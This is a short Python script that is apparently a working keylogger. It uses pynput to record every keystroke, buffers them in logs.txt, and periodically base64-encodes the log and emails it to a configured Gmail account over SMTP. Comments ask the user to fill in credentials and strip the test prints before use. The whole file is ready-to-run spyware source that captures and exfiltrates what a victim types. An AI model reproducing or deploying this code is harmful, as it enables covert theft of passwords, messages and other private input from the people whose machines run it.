from pynput.keyboard import Key, Listener
import smtplib
import base64


EMAILADR="email@gmail.com"
PASSWD="password"
# Use your credentials.
# The print statements for testing, remove them when using.

def send_email(subject, msg):
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(EMAILADR, PASSWD)
        message = 'Subject: {}\n\n{}'.format(subject, msg)
        server.sendmail(EMAILADR, EMAILADR, message)
        server.quit()
        print("Success: Email sent!")
    except Exception as e: print(e)


keys=[]
# Number of captured chars before writing to the log.txt file 
c=0
# Number of captured chars before sending the email
m=0
def on_press(key):
    print("pressed : " + str(key))
    global keys, c, m
    keys.append(str(key).replace("'", "").replace("Key.space", " ").replace("Key.", "\n"))
    c+=1
    m+=1
    if c > 10:
        c=0
        with open("logs.txt", 'a+') as f:
            f.write("".join(keys))
        f.close()
        keys=[]

        if m>10:
            m=0
            with open("logs.txt", 'r') as r:
                send_email("logs", base64.b64encode(r.read().encode()).decode())


def on_release(key):
    # Stop when escape key
    if key == Key.esc:return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
